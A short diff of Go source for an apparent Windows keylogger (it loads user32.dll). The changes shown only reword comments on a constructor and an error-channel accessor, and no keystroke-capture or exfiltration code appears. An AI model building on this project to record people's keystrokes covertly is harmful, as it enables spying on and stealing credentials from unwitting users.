@@ -32,7 +32,7 @@ var user32 = syscall.NewLazyDLL("user32.dll")
 /*
 Create <Keylogger> - init Installer structure
 	Returns <*Keylogger>:
-		1. Structure pointer
+		1. object's pointer
 */
 func (k *Keylogger) Create() *Keylogger {
 	k = &Keylogger{
@@ -66,7 +66,7 @@ func (k *Keylogger) SetLogsPath(logsPath string) {
 /*
 GetChCritError <Keylogger> - getting error channel
 	Returns <<-chan bool>:
-		1. Channel error
+		1. channel error
 */
 func (k *Keylogger) GetChCritError() <-chan bool {
 	return k.chCritError
